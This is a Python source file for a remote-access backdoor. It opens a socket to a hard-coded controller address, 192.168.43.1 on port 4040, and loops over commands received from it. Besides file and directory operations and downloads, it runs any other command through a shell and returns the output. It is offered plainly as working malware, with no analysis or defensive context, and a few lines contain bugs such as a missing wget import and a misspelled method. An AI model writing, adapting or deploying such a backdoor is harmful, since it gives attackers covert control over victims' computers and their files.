import os
from socket import *
import sys

import subprocess
import webbrowser
backdoor = socket(AF_INET, SOCK_STREAM)
backdoor.connect(("192.168.43.1",4040))
while True:
    command = backdoor.recv(1024)
    command = command.decode()
    if command == "v":
      v = "v"
      backdoor.send(v.encode())
      continue
    elif command[0:2] == "cd":
       try:
          os.chdir(command[3:])
          cd = "cd"
          backdoor.send(cd.encode())
       except:
          not_found = ("[-] Not found")
          backdoor.send(not_found.encode())
          continue
    elif command[0:3] == "pwd":
       try:
          path = ("[i] "+os.getcwd())
          backdoor.send(path.encode())
       except:
          error = ("[-] Unknown error")
          backdoor.send(error.encode())
          continue
    elif command[0:6] == "mkfile":
       try:
          open(command[7:], "w")
          mkfile = ("mkfile")
          backdoor.send(mkfile.encode())
       except:
          not_found = ("[-] Unknown error")
          backdoor.send(not_found.encode())
          continue
    elif command[0:5] == "mkdir":
      try:
          mkdir = ("mkdir")
          backdoor.send(mkdir.encode())
          os.makedirs(command[6:])
          
          continue
      except:
          not_found = ("[-] Unknown error")
          backdoor.send(not_found.encode())
          continue
    elif command[0:6] == "rmfile":
       try:
          os.remove(command[7:])
          rmfile = ("rmfile")
          backdoor.send(rmfile.encode())
       except:
          not_found = ("[-] Not found")
          backdoor.send(not_found.encode())
          continue
    elif command[0:5] == "rmdir":
       try:
           os.removedirs(command[6:])
           rmdir = "rmdir"
           backdoor.send(rmdir.encode())
       except:
          not_found = ("[-] cannot remove"+" '"+command[6:]+"'")
          backdoor.send(not_found.encode())
          continue
    elif command[0:8] == "download":
       try:
            dwl = command[9:]
            wget.download(dwl)
            download = ("download")
            backdoor.send(download.enocde())
       except:
          not_found = ("[!] Can't download this file")
          backdoor.send(not_found.encode())
          continue


    elif command[0:11] == "killprocces":
       backdoor.close()
    else:
       op = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
       output = op.stdout.read()
       output_error = op.stderr.read()
       if bool(output_error) == False:
          backdoor.send(output)
       elif bool(output_error) == True:
          error = ("[-] Unknown command: "+command+".")
          backdoor.send(error.encode())

backdoor.close()





